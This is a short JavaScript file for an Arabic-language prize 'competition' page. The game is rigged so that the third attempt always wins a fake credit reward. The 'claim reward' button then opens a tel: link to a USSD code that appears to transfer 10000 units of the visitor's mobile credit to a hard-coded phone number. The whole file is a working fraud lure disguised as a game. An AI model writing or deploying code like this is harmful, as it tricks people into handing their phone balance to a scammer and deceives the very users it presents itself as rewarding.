let attempts = 0;

function startCompetition() {
    document.getElementById("startModal").style.display = "none";
    document.getElementById("boxes").style.display = "grid";
    document.getElementById("result").innerText = "";
    document.getElementById("rewardBtn").style.display = "none";
    attempts = 0;
}

function attempt(boxNumber) {
    attempts++;
    if (attempts < 3) {
        document.getElementById("result").innerText = `المحاولة رقم ${attempts} فاشلة! حاول مرة أخرى.`;
    } else {
        document.getElementById("result").innerText = "🎉 ألف مبروك! ربحت رصيد فئة 10! 🎉";
        document.getElementById("rewardBtn").style.display = "block";
    }
}

function claimReward() {
    window.location.href = "tel://*123*10000*07712504488*1#"; // رقم الهاتف سيتم الاتصال به فورًا
}
